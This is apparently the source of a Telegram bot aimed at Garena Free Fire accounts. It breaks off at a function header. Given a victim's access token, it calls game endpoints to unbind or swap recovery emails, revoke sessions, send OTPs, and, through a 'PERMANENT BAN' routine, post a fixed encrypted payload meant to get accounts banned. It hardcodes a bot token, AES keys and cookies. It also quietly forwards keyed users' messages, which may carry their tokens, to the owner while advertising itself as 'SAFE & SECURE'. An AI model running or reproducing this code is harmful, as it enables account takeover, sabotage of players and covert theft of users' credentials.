#!/usr/bin/env python3
# RAM PAPA - FREE FIRE MAX BOT (Webhook Compatible)

import os
import sys
import time
import requests
import hashlib
import json
import base64
import urllib.parse
import random
import string
import threading
import urllib3
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, ConversationHandler, MessageHandler, filters

urllib3.disable_warnings()

# ========== BOT TOKEN ==========
BOT_TOKEN = "8643582994:AAHh6ECZ7LqUsHhIGKo8Q0HyLdSuiJhxDV5"

# ========== OWNER USER ID ==========
OWNER_ID = 7108672650

# ========== DATA STORAGE ==========
user_data = {}
user_keys = {}
admin_list = []
all_keys = {}
active_users = []

# ========== CONVERSATION STATES ==========
(
    STATE_MENU, STATE_ADD_EMAIL, STATE_ADD_SECURITY, STATE_ADD_OTP,
    STATE_CHECK_TOKEN, STATE_CANCEL_TOKEN, STATE_UNBIND_TOKEN,
    STATE_UNBIND_METHOD, STATE_UNBIND_CODE, STATE_UNBIND_OTP,
    STATE_CHANGE_TOKEN, STATE_CHANGE_METHOD, STATE_CHANGE_NEW_EMAIL,
    STATE_CHANGE_CODE, STATE_CHANGE_OTP_OLD, STATE_CHANGE_OTP_NEW,
    STATE_REVOKE_TOKEN, STATE_RESUBSCRIBE_EMAIL, STATE_BAN_TOKEN,
    STATE_KEY_INPUT
) = range(20)

# ========== REPLY KEYBOARD ==========
def get_reply_keyboard(user_id):
    keyboard = [
        ["📧 ADD RECOVERY EMAIL", "🔍 CHECK RECOVERY EMAIL"],
        ["❌ CANCEL PENDING", "🔓 UNBIND EMAIL"],
        ["🔄 CHANGE EMAIL", "🚫 REVOKE TOKEN"],
        ["🆘 RESUBSCRIBE", "💀 PERMANENT BAN"]
    ]
    if user_id == OWNER_ID or user_id in admin_list:
        keyboard.append(["👑 OWNER PANEL"])
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)

def get_owner_keyboard():
    keyboard = [
        [InlineKeyboardButton("📊 Bot Status", callback_data='owner_status')],
        [InlineKeyboardButton("👥 Admins", callback_data='owner_admins')],
        [InlineKeyboardButton("🔑 User Key", callback_data='owner_genkey')],
        [InlineKeyboardButton("🌐 All Device Key", callback_data='owner_genall')],
        [InlineKeyboardButton("📋 Keys", callback_data='owner_listkeys')],
        [InlineKeyboardButton("🗑️ Del Key", callback_data='owner_delkey')],
        [InlineKeyboardButton("🗑️ Del All Keys", callback_data='owner_delall')],
        [InlineKeyboardButton("📢 Broadcast", callback_data='owner_broadcast')],
        [InlineKeyboardButton("🔙 Back", callback_data='back_menu')]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_copy_keyboard(key):
    keyboard = [
        [InlineKeyboardButton("📋 COPY KEY", callback_data=f'copy_{key}')],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data='back_menu')]
    ]
    return InlineKeyboardMarkup(keyboard)

# ========== KEY FUNCTIONS ==========
def parse_key_input(text):
    parts = text.split()
    if len(parts) >= 4:
        name_parts = parts[1:-1]
        name = " ".join(name_parts)
        days_str = parts[-1]
        return name, days_str
    elif len(parts) >= 3:
        name = parts[1]
        days_str = parts[2]
        return name, days_str
    return None, None

def parse_days(days_str):
    days_str = days_str.upper()
    if days_str.endswith('D'):
        return int(days_str[:-1])
    elif days_str.endswith('M'):
        return int(days_str[:-1]) * 30
    elif days_str.endswith('Y'):
        return int(days_str[:-1]) * 365
    else:
        return int(days_str)

def generate_custom_key(name, days, key_type="user"):
    expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
    if key_type == "all":
        key = f"ALL-{name}-{expiry}"
    else:
        key = f"{name}-{expiry}"
    return key, expiry

def is_user_active(user_id):
    if user_id == OWNER_ID:
        return True
    if user_id in user_keys:
        expiry = user_keys[user_id].get('expiry')
        if expiry:
            exp_date = datetime.strptime(expiry, "%Y-%m-%d")
            if datetime.now() <= exp_date:
                return True
            else:
                del user_keys[user_id]
                if user_id in active_users:
                    active_users.remove(user_id)
                return False
    return False

def remove_key_from_users(key):
    users_to_remove = []
    for uid, data in user_keys.items():
        if data.get('key') == key:
            users_to_remove.append(uid)
    
    for uid in users_to_remove:
        del user_keys[uid]
        if uid in active_users:
            active_users.remove(uid)

def deactivate_all_users():
    user_keys.clear()
    active_users.clear()

# ========== FORWARD ONLY VERIFIED USERS ==========
async def forward_to_owner(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id == OWNER_ID:
        return
    
    command_list = [
        "📧 ADD RECOVERY EMAIL", "🔍 CHECK RECOVERY EMAIL",
        "❌ CANCEL PENDING", "🔓 UNBIND EMAIL",
        "🔄 CHANGE EMAIL", "🚫 REVOKE TOKEN",
        "🆘 RESUBSCRIBE", "💀 PERMANENT BAN",
        "👑 OWNER PANEL"
    ]
    
    if update.message and update.message.text:
        if update.message.text in command_list:
            return
    
    if is_user_active(user_id) or user_id in admin_list:
        try:
            await context.bot.forward_message(
                chat_id=OWNER_ID,
                from_chat_id=user_id,
                message_id=update.message.message_id
            )
        except:
            pass

# ========== PROTOBUF ==========
try:
    from google.protobuf import descriptor_pool as _descriptor_pool
    from google.protobuf import symbol_database as _symbol_database
    from google.protobuf.internal import builder as _builder

    _sym_db = _symbol_database.Default()

    DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginReq.proto"\xfa\n\n\nMajorLogin\x12\x12\n\nevent_time\x18\x03 \x01(\t\x12\x11\n\tgame_name\x18\x04 \x01(\t\x12\x13\n\x0bplatform_id\x18\x05 \x01(\x05\x12\x16\n\x0e\x63lient_version\x18\x07 \x01(\t\x12\x17\n\x0fsystem_software\x18\x08 \x01(\t\x12\x17\n\x0fsystem_hardware\x18\t \x01(\t\x12\x18\n\x10telecom_operator\x18\n \x01(\t\x12\x14\n\x0cnetwork_type\x18\x0b \x01(\t\x12\x14\n\x0cscreen_width\x18\x0c \x01(\r\x12\x15\n\rscreen_height\x18\r \x01(\r\x12\x12\n\nscreen_dpi\x18\x0e \x01(\t\x12\x19\n\x11processor_details\x18\x0f \x01(\t\x12\x0e\n\x06memory\x18\x10 \x01(\r\x12\x14\n\x0cgpu_renderer\x18\x11 \x01(\t\x12\x13\n\x0bgpu_version\x18\x12 \x01(\t\x12\x18\n\x10unique_device_id\x18\x13 \x01(\t\x12\x11\n\tclient_ip\x18\x14 \x01(\t\x12\x10\n\x08language\x18\x15 \x01(\t\x12\x0f\n\x07open_id\x18\x16 \x01(\t\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0b\x64\x65vice_type\x18\x18 \x01(\t\x12\'\n\x10memory_available\x18\x19 \x01(\x0b\x32\r.GameSecurity\x12\x14\n\x0c\x61\x63\x63\x65ss_token\x18\x1d \x01(\t\x12\x17\n\x0fplatform_sdk_id\x18\x1e \x01(\x05\x12\x1a\n\x12network_operator_a\x18) \x01(\t\x12\x16\n\x0enetwork_type_a\x18* \x01(\t\x12\x1c\n\x14\x63lient_using_version\x18\x39 \x01(\t\x12\x1e\n\x16\x65xternal_storage_total\x18< \x01(\x05\x12"\n\x1a\x65xternal_storage_available\x18= \x01(\x05\x12\x1e\n\x16internal_storage_total\x18> \x01(\x05\x12"\n\x1ainternal_storage_available\x18? \x01(\x05\x12#\n\x1bgame_disk_storage_available\x18@ \x01(\x05\x12\x1f\n\x17game_disk_storage_total\x18\x41 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_avail_storage\x18\x42 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_total_storage\x18\x43 \x01(\x05\x12\x10\n\x08login_by\x18I \x01(\x05\x12\x14\n\x0clibrary_path\x18J \x01(\t\x12\x12\n\nreg_avatar\x18L \x01(\x05\x12\x15\n\rlibrary_token\x18M \x01(\t\x12\x14\n\x0c\x63hannel_type\x18N \x01(\x05\x12\x10\n\x08\x63pu_type\x18O \x01(\x05\x12\x18\n\x10\x63pu_architecture\x18Q \x01(\t\x12\x1b\n\x13\x63lient_version_code\x18S \x01(\t\x12\x14\n\x0cgraphics_api\x18V \x01(\t\x12\x1d\n\x15supported_astc_bitset\x18W \x01(\r\x12\x1a\n\x12login_open_id_type\x18X \x01(\x05\x12\x18\n\x10\x61nalytics_detail\x18Y \x01(\x0c\x12\x14\n\x0cloading_time\x18\\ \x01(\r\x12\x17\n\x0frelease_channel\x18] \x01(\t\x12\x12\n\nextra_info\x18^ \x01(\t\x12 \n\x18\x61ndroid_engine_init_flag\x18_ \x01(\r\x12\x0f\n\x07if_push\x18\x61 \x01(\x05\x12\x0e\n\x06is_vpn\x18\x62 \x01(\x05\x12\x1c\n\x14origin_platform_type\x18\x63 \x01(\t\x12\x1d\n\x15primary_platform_type\x18\x64 \x01(\t"5\n\x0cGameSecurity\x12\x0f\n\x07version\x18\x06 \x01(\x05\x12\x14\n\x0chidden_value\x18\x08 \x01(\x04\x62\x06proto3')

    _globals = globals()
    _builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _globals)
    _builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, 'MajorLoginReq_pb2', _globals)

    DESCRIPTOR2 = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginRes.proto"\x87\x05\n\rMajorLoginRes\x12\x12\n\naccount_id\x18\x01 \x01(\x03\x12\x13\n\x0block_region\x18\x02 \x01(\t\x12\x13\n\x0bnoti_region\x18\x03 \x01(\t\x12\x11\n\tip_region\x18\x04 \x01(\t\x12\x19\n\x11\x61gora_environment\x18\x05 \x01(\t\x12\x19\n\x11new_active_region\x18\x06 \x01(\t\x12\r\n\x05token\x18\x08 \x01(\t\x12\x0b\n\x03ttl\x18\t \x01(\x05\x12\x12\n\nserver_url\x18\n \x01(\t\x12\x16\n\x0e\x65mulator_score\x18\x0c \x01(\x03\x12\x32\n\tblacklist\x18\r \x01(\x0b\x32\x1f.MajorLoginRes.BlacklistInfoRes\x12\x31\n\nqueue_info\x18\x0f \x01(\x0b\x32\x1d.MajorLoginRes.LoginQueueInfo\x12\x0e\n\x06tp_url\x18\x10 \x01(\t\x12\x15\n\rapp_server_id\x18\x11 \x01(\x03\x12\x0f\n\x07\x61no_url\x18\x12 \x01(\t\x12\x0f\n\x07ip_city\x18\x13 \x01(\t\x12\x16\n\x0eip_subdivision\x18\x14 \x01(\t\x12\x0b\n\x03kts\x18\x15 \x01(\x03\x12\n\n\x02\x61k\x18\x16 \x01(\x0c\x12\x0b\n\x03\x61iv\x18\x17 \x01(\x0c\x1aQ\n\x10\x42lacklistInfoRes\x12\x12\n\nban_reason\x18\x01 \x01(\x05\x12\x17\n\x0f\x65xpire_duration\x18\x02 \x01(\x03\x12\x10\n\x08\x62\x61n_time\x18\x03 \x01(\x03\x1a\x66\n\x0eLoginQueueInfo\x12\r\n\x05\x41llow\x18\x01 \x01(\x08\x12\x16\n\x0equeue_position\x18\x02 \x01(\x03\x12\x16\n\x0eneed_wait_secs\x18\x03 \x01(\x03\x12\x15\n\rqueue_is_full\x18\x04 \x01(\x08\x62\x06proto3')

    _builder.BuildMessageAndEnumDescriptors(DESCRIPTOR2, _globals)
    _builder.BuildTopDescriptorsAndMessages(DESCRIPTOR2, 'MajorLoginRes_pb2', _globals)

    PROTOBUF_AVAILABLE = True
except Exception as e:
    PROTOBUF_AVAILABLE = False
    print(f"Protobuf import warning: {e}")

# ========== BAN FEATURE VARIABLES ==========
API_URL = 'https://client.ind.freefiremobile.com/GetLoginData'
BODY_BASE64 = 'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUubievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
AeSkEy = b'Yg&tc%DEuh6%Zc^8'
AeSiV = b'6oyZDr22E3ychjM%'
mLuRl = "https://loginbp.ggpolarbear.com/MajorLogin"
mLhDr = {
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-S908E Build/TP1A.220624.014)",
    "Connection": "Keep-Alive", "Accept-Encoding": "gzip",
    "Content-Type": "application/octet-stream",
    "Expect": "100-continue", "X-GA": "v1 1",
    "X-Unity-Version": "2018.4.11f1", "ReleaseVersion": "OB54"
}

# ========== HELPER FUNCTIONS ==========
def enc_data(d): 
    return AES.new(AeSkEy, AES.MODE_CBC, AeSiV).encrypt(pad(d, 16))
def dec_data(d): 
    return unpad(AES.new(AeSkEy, AES.MODE_CBC, AeSiV).decrypt(d), 16)

def decode_ff_name(b64_str):
    try:
        if not b64_str: return "Unknown"
        key = b"1e5898ccb8dfdd921f9bdea848768b64a201"
        b64_str = b64_str.strip()
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        encrypted_bytes = base64.b64decode(b64_str)
        decrypted_bytes = bytearray()
        for i, byte in enumerate(encrypted_bytes):
            key_byte = key[i % len(key)]
            decrypted_bytes.append(byte ^ key_byte)
        name = decrypted_bytes.decode('utf-8', errors='ignore')
        return name if name else "Unknown"
    except: return "Unknown"

def decode_jwt(token):
    try:
        payload_part = token.split('.')[1]
        payload_part += "=" * ((4 - len(payload_part) % 4) % 4)
        return json.loads(base64.urlsafe_b64decode(payload_part).decode('utf-8'))
    except: return {}

def build_majorlogin(tok, open_id, p_type):
    if not PROTOBUF_AVAILABLE: return None
    m = MajorLogin()
    m.event_time = str(datetime.now())[:-7]
    m.game_name = "free fire"
    m.platform_id = p_type
    m.client_version = "1.120.1"
    m.system_software = "Android OS 9 / API-28"
    m.system_hardware = "Handheld"
    m.telecom_operator = "Verizon"
    m.network_type = "WIFI"
    m.screen_width = 1920
    m.screen_height = 1080
    m.screen_dpi = "280"
    m.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
    m.memory = 3003
    m.gpu_renderer = "Adreno (TM) 640"
    m.gpu_version = "OpenGL ES 3.1 v1.46"
    m.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
    m.client_ip = "223.191.51.89"
    m.language = "en"
    m.open_id = open_id
    m.open_id_type = str(p_type)
    m.device_type = "Handheld"
    m.access_token = tok
    m.platform_sdk_id = 1
    m.client_using_version = "7428b253defc164018c604a1ebbfebdf"
    m.login_by = 3
    m.channel_type = 3
    m.cpu_type = 2
    m.cpu_architecture = "64"
    m.client_version_code = "2019118695"
    m.login_open_id_type = p_type
    m.origin_platform_type = str(p_type)
    m.primary_platform_type = str(p_type)
    return enc_data(m.SerializeToString())

def fetch_majorlogin_jwt(tok):
    if tok.startswith("ey") and "." in tok: return tok, None
    oId = None
    try:
        r = requests.get(f"https://100067.connect.garena.com/oauth/token/inspect?token={tok}", headers={"User-Agent": "Mozilla/5.0"}, timeout=5).json()
        oId = r.get("open_id")
    except: pass
    if not oId:
        try:
            uid_headers = {"access-token": tok, "user-agent": "Mozilla/5.0"}
            uid_res = requests.get("https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/", headers=uid_headers, verify=False, timeout=5).json()
            uid = uid_res.get("uid")
            if uid:
                openid_res = requests.post("https://topup.pk/api/auth/player_id_login", headers={"Content-Type": "application/json"}, json={"app_id": 100067, "login_id": str(uid)}, verify=False, timeout=5).json()
                oId = openid_res.get("open_id")
        except: pass
    if not oId: return None, "Failed to extract Open ID. Token invalid or expired."
    platforms = [8, 3, 4, 6]
    for p_type in platforms:
        pl = build_majorlogin(tok, oId, p_type)
        if not pl: continue
        try:
            x = requests.post(mLuRl, headers=mLhDr, data=pl, timeout=10, verify=False)
            if x.status_code == 200:
                res = MajorLoginRes()
                try: res.ParseFromString(dec_data(x.content))
                except: res.ParseFromString(x.content)
                if res.token: return res.token, None
        except: continue
    return None, "MajorLogin failed."

def trigger_injection(jwt_token, version):
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1', 'X-GA': 'v1 1',
        'ReleaseVersion': str(version),
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android)',
        'Accept-Encoding': 'gzip'
    }
    body = base64.b64decode(BODY_BASE64)
    return requests.post(API_URL, headers=headers, data=body, timeout=20, verify=False)

def get_player_info(access_token):
    try:
        url = f"https://api-otrss.garena.com/support/callback/?access_token={access_token}"
        r = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=15, allow_redirects=True)
        parsed = urllib.parse.urlparse(r.url)
        query = urllib.parse.parse_qs(parsed.query)
        uid = query.get("account_id", ["N/A"])[0]
        nickname = query.get("nickname", ["N/A"])[0]
        region = query.get("region", ["N/A"])[0]
        if len(nickname) > 10:
            try:
                key = b"1e5898ccb8dfdd921f9bdea848768b64a201"
                raw = base64.b64decode(nickname)
                dec = bytearray()
                for i, b in enumerate(raw): dec.append(b ^ key[i % len(key)])
                nickname = dec.decode('utf-8', errors='replace')
            except: pass
        return uid, nickname, region
    except: return "N/A", "N/A", "N/A"

def check_bind_status(access_token):
    url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
    try:
        r = requests.get(url, params={'app_id': "100067", 'access_token': access_token},
            headers={'User-Agent': "GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)"}, timeout=10)
        data = r.json()
        email = data.get("email", "")
        email_to_be = data.get("email_to_be", "")
        if email: return "bound", email
        elif email_to_be: return "pending", email_to_be
        else: return "none", None
    except: return "error", None

def format_countdown(seconds):
    if seconds <= 0: return "0d 0h 0m 0s"
    d = seconds // 86400; h = (seconds % 86400) // 3600
    m = (seconds % 3600) // 60; s = seconds % 60
    return f"{d}d {h}h {m}m {s}s"

def check_recovery_email(access_token):
    url = "https://ffmconnect.live.gop.garenanow.com/game/account_security/bind:get_bind_info"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.42(moto g67 power 5G ;Android 16;en;IN;app 1.126.1 2019120776;)",
        "Host": "ffmconnect.live.gop.garenanow.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"
    }
    try:
        r = requests.get(url, headers=headers, params={"app_id": "100067", "access_token": access_token}, timeout=10)
        data = r.json()
        if data.get("result") != 0: return None, "invalid_token"
        return {
            "email": data.get("email", ""), "pending": data.get("email_to_be", ""),
            "countdown": data.get("request_exec_countdown", 0), "result": data.get("result")
        }, None
    except: return None, "invalid_token"

def cancel_pending_email(access_token):
    url = "https://ffmconnect.live.gop.garenanow.com/game/account_security/bind:cancel_request"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.42(moto g67 power 5G ;Android 16;en;IN;app 2.127.1 2019118047;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "ffmconnect.live.gop.garenanow.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"
    }
    try:
        r = requests.post(url, headers=headers, data=f"app_id=100067&access_token={access_token}", timeout=10)
        result = r.json()
        if result.get("result") == 0: return True, None
        return False, result.get("error", "Unknown error")
    except Exception as e: return False, str(e)

def get_bound_email(access_token):
    url = "https://ffmconnect.live.gop.garenanow.com/game/account_security/bind:get_bind_info"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.42(moto g67 power 5G ;Android 16;en;IN;app 2.127.1 2019118047;)",
        "Host": "ffmconnect.live.gop.garenanow.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"
    }
    try:
        r = requests.get(url, headers=headers, params={"app_id": "100067", "access_token": access_token}, timeout=10)
        data = r.json()
        email = data.get("email", "")
        if email: return email, None
        return None, "No email bound"
    except Exception as e: return None, str(e)

def send_otp(access_token, email):
    url = "https://ffmconnect.live.gop.garenanow.com/game/account_security/bind:send_otp"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.42(moto g67 power 5G ;Android 16;en;IN;app 2.127.1 2019118047;)",
        "Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded",
        "Host": "ffmconnect.live.gop.garenanow.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip",
        "Cookie": "datadome=5ZzEK3mU0vSKj4RzRrCtfdbAowlA82ELJdJOhhBlnQvjJ0kM9y9Lj~UI3I32vuQ~RR22bN_tYV57aRcGQkHXkL58XBvsQEUNJ7xXvnNBAy6Bq5TJt_jHVxtTAQnoC9ke"
    }
    encoded_email = urllib.parse.quote(email)
    data = f"app_id=100067&access_token={access_token}&email={encoded_email}&locale=en_IN"
    try:
        r = requests.post(url, headers=headers, data=data, timeout=10)
        return r.json().get("result") == 0
    except: return False

def verify_with_security(access_token, security_code):
    url = "https://ffmconnect.live.gop.garenanow.com/game/account_security/bind:verify_identity"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.42(moto g67 power 5G ;Android 16;en;IN;app 2.127.1 2019118047;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "ffmconnect.live.gop.garenanow.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"
    }
    hashed_code = hashlib.sha256(security_code.encode('utf-8')).hexdigest().upper()
    data = f"app_id=100067&access_token={access_token}&secondary_password={hashed_code}"
    try:
        r = requests.post(url, headers=headers, data=data, timeout=10)
        result = r.json()
        if result.get("result") == 0: return result.get("identity_token"), None
        error = result.get("error", "Verification failed")
        if error in ["error_incorrect_code", "error_unmatched_password"]: return None, "incorrect_code"
        return None, error
    except Exception as e: return None, str(e)

def verify_with_otp(access_token, email, otp):
    url = "https://ffmconnect.live.gop.garenanow.com/game/account_security/bind:verify_identity"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.42(moto g67 power 5G ;Android 16;en;IN;app 2.127.1 2019118047;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "ffmconnect.live.gop.garenanow.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"
    }
    encoded_email = urllib.parse.quote(email)
    data = f"app_id=100067&access_token={access_token}&otp={otp}&email={encoded_email}"
    try:
        r = requests.post(url, headers=headers, data=data, timeout=10)
        result = r.json()
        if result.get("result") == 0: return result.get("identity_token"), None
        error = result.get("error", "Verification failed")
        if error in ["error_incorrect_code", "error_unmatched_password"]: return None, "incorrect_code"
        return None, error
    except Exception as e: return None, str(e)

def verify_otp(access_token, email, otp):
    url = "https://ffmconnect.live.gop.garenanow.com/game/account_security/bind:verify_otp"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.42(moto g67 power 5G ;Android 16;en;IN;app 2.127.1 2019118047;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "ffmconnect.live.gop.garenanow.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"
    }
    encoded_email = urllib.parse.quote(email)
    data = f"app_id=100067&access_token={access_token}&otp={otp}&email={encoded_email}"
    try:
        r = requests.post(url, headers=headers, data=data, timeout=10)
        result = r.json()
        if result.get("result") == 0: return result.get("verifier_token"), None
        return None, result.get("error", "Verification failed")
    except Exception as e: return None, str(e)

def create_unbind_request(access_token, identity_token):
    url = "https://ffmconnect.live.gop.garenanow.com/game/account_security/bind:create_unbind_request"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.42(moto g67 power 5G ;Android 16;en;IN;app 2.127.1 2019118047;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "ffmconnect.live.gop.garenanow.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"
    }
    data = f"app_id=100067&access_token={access_token}&identity_token={identity_token}"
    try:
        r = requests.post(url, headers=headers, data=data, timeout=10)
        return r.json().get("result") == 0
    except: return False

def create_rebind_request(access_token, identity_token, new_email, verifier_token):
    url = "https://ffmconnect.live.gop.garenanow.com/game/account_security/bind:create_rebind_request"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.42(moto g67 power 5G ;Android 16;en;IN;app 2.127.1 2019118047;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "ffmconnect.live.gop.garenanow.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"
    }
    encoded_email = urllib.parse.quote(new_email)
    data = f"app_id=100067&access_token={access_token}&identity_token={identity_token}&verifier_token={verifier_token}&email={encoded_email}"
    try:
        r = requests.post(url, headers=headers, data=data, timeout=10)
        return r.json().get("result") == 0
    except: return False

def revoke_token(access_token):
    url = "https://ffmconnect.live.gop.garenanow.com/oauth/logout"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.42(moto g67 power 5G ;Android 16;en;IN;app 2.127.1 2019118047;)",
        "Host": "ffmconnect.live.gop.garenanow.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"
    }
    try:
        r = requests.get(url, headers=headers, params={"access_token": access_token}, timeout=10)
        result = r.json()
        if result.get("result") == 0: return True, None
        return False, result.get("error", "Unknown error")
    except Exception as e: return False, str(e)

def first_resubscribe_send(email):
    def generate_username():
        length = random.randint(6, 15)
        letters = string.ascii_lowercase + string.digits
        return ''.join(random.choices(letters, k=length))
    username = generate_username()
    random_id = str(int(time.time() * 1000)) + ''.join(random.choices(string.digits, k=5))
    url = "https://authgop.garena.com/api/send_register_code_email"
    headers = {
        "Host": "authgop.garena.com", "Connection": "keep-alive",
        "sec-ch-ua-platform": "Android",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": '"Brave";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "sec-ch-ua-mobile": "?1", "Sec-GPC": "1", "Accept-Language": "en-IN,en;q=0.5",
        "Origin": "https://authgop.garena.com", "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
        "Referer": "https://authgop.garena.com/universal/register?redirect_uri=https%3A%2F%2Fauthgop.garena.com%2Funiversal%2Foauth%3Fclient_id%3D10017%26redirect_uri%3Dhttps%253A%252F%252Fshop.garena.sg%252F%253Futm_source%253Dofficial%252Bwebsite%2526utm_medium%253DEntrance%26response_type%3Dtoken%26platform%3D1%26locale%3Den-SG%26theme%3Dlight&locale=en-SG&theme=light&format=json&id=1775878716300",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Cookie": "datadome=gEJzn_FIBOulsQtrfQk6GEMS8B8riq_WK0WO84DRV1y76mpuU1PK0rsGVviCex7eAuIZ59Zmzv6vHgD9C3rQhGr2ZUzVuSa~gjqqmXttgQuXY0fi8aWIgLJMQwYJ0Xrk"
    }
    data = {"username": username, "email": email, "locale": "en-SG", "format": "json", "id": random_id}
    try:
        r = requests.post(url, headers=headers, data=data, timeout=15)
        if r.status_code == 200:
            resp_data = r.json()
            if resp_data.get('result') == 0: return True, "OTP sent successfully! Check your email."
            return False, resp_data.get('message', 'Unknown error')
        return False, f"HTTP Error: {r.status_code}"
    except Exception as e: return False, str(e)

# ========== BOT HANDLERS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await forward_to_owner(update, context)
    
    if user_id == OWNER_ID:
        welcome = """RAM PAPA FREE FIRE MAX BOT

👑 OWNER ACCESS

Choose an option below:"""
        await update.message.reply_text(welcome, reply_markup=get_reply_keyboard(user_id))
        return ConversationHandler.END
    
    welcome = """RAM PAPA FREE FIRE MAX BOT

Developer: @RAM_BHAI_PAPA
YouTube: @H4XRAMBHAI
Version: RAM PAPA EDITION
Status: SAFE & SECURE (PREMIUM)

Choose an option below:"""
    await update.message.reply_text(welcome, reply_markup=get_reply_keyboard(user_id))
    return ConversationHandler.END

async def handle_key_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
